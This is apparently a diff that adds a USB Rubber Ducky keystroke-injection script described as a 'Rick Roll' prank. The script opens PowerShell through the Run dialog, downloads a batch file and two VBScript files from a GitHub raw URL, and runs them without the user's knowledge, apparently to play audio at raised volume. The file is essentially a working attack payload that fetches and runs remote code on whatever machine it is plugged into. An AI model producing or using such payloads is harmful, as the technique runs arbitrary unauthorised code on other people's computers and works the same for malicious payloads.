@@ -1,0 +1,12 @@
+REM Author: [LONG]
+REM Version: [1.0]
+REM Decription: Rick Roll.
+GUI r
+DELAY 500
+STRING Powershell
+DELAY 500
+ENTER
+DELAY 1000
+STRING cd desktop; New-Item "Rick" -ItemType Directory; cd Rick; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Rick/main/RICK.bat' -OutFile ./Rick.bat; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Rick/main/Rick.vbs' -OutFile ./RickSound.vbs; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Rick/main/vol.vbs' -OutFile ./RickVOL.vbs; Start-Process -FilePath "RickVOL.vbs"; Start-Process -FilePath "RickSound.vbs"; Start-Process -FilePath "RICK.bat"
+DELAY 500
+ENTER
